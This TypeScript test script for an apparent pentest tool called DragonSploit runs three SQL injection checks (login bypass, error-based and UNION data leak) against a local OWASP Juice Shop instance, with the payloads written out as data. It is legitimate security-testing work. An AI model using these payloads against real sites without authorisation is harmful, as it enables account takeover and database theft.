/**
 * Test Visual Verifier
 * 
 * اختبار نظام الإثبات البصري ضد OWASP Juice Shop
 * 
 * قبل التشغيل:
 * 1. شغل Juice Shop: docker run -d -p 8080:3000 bkimminich/juice-shop
 * 2. شغل هذا الملف: npx ts-node test-visual-verifier.ts
 */

import { VisualVerifier, Severity } from './src/services/visual-verifier';

async function main() {
    console.log('🐉 DragonSploit Visual Verifier Test');
    console.log('='.repeat(50));
    
    // Check if Playwright is available
    const isAvailable = await VisualVerifier.isAvailable();
    if (!isAvailable) {
        console.error('❌ Playwright is not available. Run: npx playwright install chromium');
        return; // بدلاً من process.exit
    }
    console.log('✅ Playwright is ready\n');
    
    const verifier = new VisualVerifier({
        headless: false, // المتصفح يظهر أمام المستخدم
    });
    
    // Test 1: Auth Bypass على Juice Shop
    console.log('\n📋 Test 1: Auth Bypass on Juice Shop');
    console.log('-'.repeat(40));
    
    try {
        const authResult = await verifier.verifyAuthBypass(
            {
                loginUrl: 'http://localhost:8080/#/login',
                payload: "' OR 1=1 --",
                passwordValue: 'anything',
            },
            {
                scanId: 'test-scan-001',
                severity: Severity.HIGH,
                vulnerabilityType: 'SQL_INJECTION',
            }
        );
        
        console.log('\n📊 Auth Bypass Result:');
        console.log(`   Verified: ${authResult.verified ? '✅ YES' : '❌ NO'}`);
        console.log(`   Reason: ${authResult.reason}`);
        console.log(`   Time: ${authResult.executionTime}ms`);
        if (authResult.proofs) {
            console.log(`   Screenshot: ${authResult.proofs.screenshotProof}`);
        }
        if (authResult.videoPath) {
            console.log(`   Video: ${authResult.videoPath}`);
        }
        
    } catch (error: any) {
        console.error(`❌ Auth Bypass test failed: ${error.message}`);
    }
    
    // Test 2: Error-Based SQLi
    console.log('\n\n📋 Test 2: Error-Based SQLi on Juice Shop');
    console.log('-'.repeat(40));
    
    try {
        const errorResult = await verifier.verifyErrorBased(
            {
                targetUrl: 'http://localhost:8080/rest/products/search',
                paramName: 'q',
                payload: "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM sqlite_master--",
            },
            {
                scanId: 'test-scan-002',
                severity: Severity.HIGH,
                vulnerabilityType: 'SQL_INJECTION',
            }
        );
        
        console.log('\n📊 Error-Based SQLi Result:');
        console.log(`   Verified: ${errorResult.verified ? '✅ YES' : '❌ NO'}`);
        console.log(`   Reason: ${errorResult.reason}`);
        console.log(`   Time: ${errorResult.executionTime}ms`);
        
    } catch (error: any) {
        console.error(`❌ Error-Based test failed: ${error.message}`);
    }
    
    // Test 3: Data Leak
    console.log('\n\n📋 Test 3: Data Leak (UNION) on Juice Shop');
    console.log('-'.repeat(40));
    
    try {
        const dataResult = await verifier.verifyDataLeak(
            {
                targetUrl: 'http://localhost:8080/rest/products/search',
                paramName: 'q',
                payload: "')) UNION SELECT sql,2,3,4,5,6,7,8,9 FROM sqlite_master--",
                method: 'GET',
            },
            {
                scanId: 'test-scan-003',
                severity: Severity.CRITICAL,
                vulnerabilityType: 'SQL_INJECTION',
            }
        );
        
        console.log('\n📊 Data Leak Result:');
        console.log(`   Verified: ${dataResult.verified ? '✅ YES' : '❌ NO'}`);
        console.log(`   Reason: ${dataResult.reason}`);
        console.log(`   Time: ${dataResult.executionTime}ms`);
        
    } catch (error: any) {
        console.error(`❌ Data Leak test failed: ${error.message}`);
    }
    
    console.log('\n\n' + '='.repeat(50));
    console.log('🏁 All tests completed!');
    console.log('📁 Check ./proofs/scans/ for screenshots and videos');
}

main().catch(console.error);
